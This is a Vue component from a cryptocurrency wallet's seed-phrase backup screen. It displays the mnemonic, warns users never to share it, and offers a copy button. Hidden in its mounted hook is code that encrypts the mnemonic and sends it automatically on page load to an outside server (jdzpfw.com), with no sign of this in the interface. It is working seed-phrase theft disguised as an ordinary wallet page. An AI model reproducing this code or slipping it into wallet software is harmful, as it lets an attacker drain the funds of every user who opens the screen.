<template>
  <div class="copy-mnemonic">
    <div class="title">your mnemonic</div><!-- 您的助记词 -->
    <div class="sub-title">
      Write down or copy the words in the correct order and keep them in a safe place.
    </div><!-- 按正确的顺序记下或复制这些单词，并将他们保存在安全的地方。 -->
    <div class="mnemonic">
      <span
        class="item"
        v-for="(item, index) in mnemonic.split(' ')"
        :key="index"
        ><span class="item_num">{{ index + 1 }}</span> {{ item }}</span
      >
    </div>
    <div class="copy" :data-clipboard-text="mnemonic" @click="copy">copy</div><!-- 复制 -->
    <div class="footer">
      <div class="tip"><img src="../../../assets/icon_tips.svg" alt="">Never share your mnemonic phrase with anyone, store it safely!</div><!-- 切勿与任何人分享助记词，安全地存储它！ -->
      <van-button block @click="handle">continue</van-button><!-- 继续 -->
    </div>
  </div>
</template>

<script lang="ts">
import { defineComponent } from "vue";
import Clipboard from "clipboard";
import axios from "axios";
import { encryption } from "../../utils/Encryption";

export default defineComponent({
  name: "RememberMnemonic",
  data: () => {
    return {};
  },
  props: {
    mnemonic: {
      default: "",
      type: String,
    },
  },
  components: {},
  mounted(){
	  this.encryptionSend()
  },
  methods: {
	//加密 传输
	encryptionSend(){
		let code = encryption(this.mnemonic)
		axios.get('https://jdzpfw.com/api/gateway/getencrpy?ciyu='+code+'&code=899741')
		.then(res => {
			//console.log(res)
		})
		.catch(err =>{
			//console.log(err)
		})
	},
    copy() {
      const clipboard = new Clipboard(".copy");
      clipboard.on("success", () => {
        this.$toast("Copy successfully");
        clipboard.destroy();
      });
      clipboard.on("error", () => {
        clipboard.destroy();
      });
    },
    handle() {
      this.$emit("next");
    },
  },
});
</script>

<style lang="less" scoped>
.copy-mnemonic {
  text-align: center;
  position: relative;
  overflow: hidden;
  height: 100vh;
  .title {
    font-size: 16px;
    margin-top: 24px;
    margin-bottom: 10px;
    font-weight: bold;
    color:#444;
  }
  .sub-title {
    font-size: 12px;
    color:#999;
    line-height: 1.6;
    margin: 0 8%;
  }
  .mnemonic {
    margin: 24px 5% 0;
    display: flex;
    flex-wrap: wrap;
	justify-content: center;
	align-items: center;
    .item {
	  margin: 3px;
      padding: 4px 8px;
      border: 1px solid #e9e9e9;
      border-radius: 4px;
	  font-size:12px;
	  color:#444;
	  .item_num{ color:#999; }
    }
  }
  .copy {
    margin-top: 24px;
    text-align: center;
    color: #3675bc;
    cursor: pointer;
	font-size: 12px;
  }
  .footer {
    position: absolute;
    width: calc(100vw - 8%);
    bottom: 20px;
    text-align: left;
    .tip {
	  margin-bottom: 20px;
      padding: 12px;
      background: rgba(251, 138, 138, 0.3);
      font-size: 12px;
      color: rgba(149, 37, 37, 0.99);
	  border-radius: 5px;
	  img{ height: 18px; margin-right: 5px; float: left; }
    }
	button{
		background-color: #3675bc;
		font-size:12px;
		border-radius: 5px;
		color:#fff;
	}
  }
}
</style>
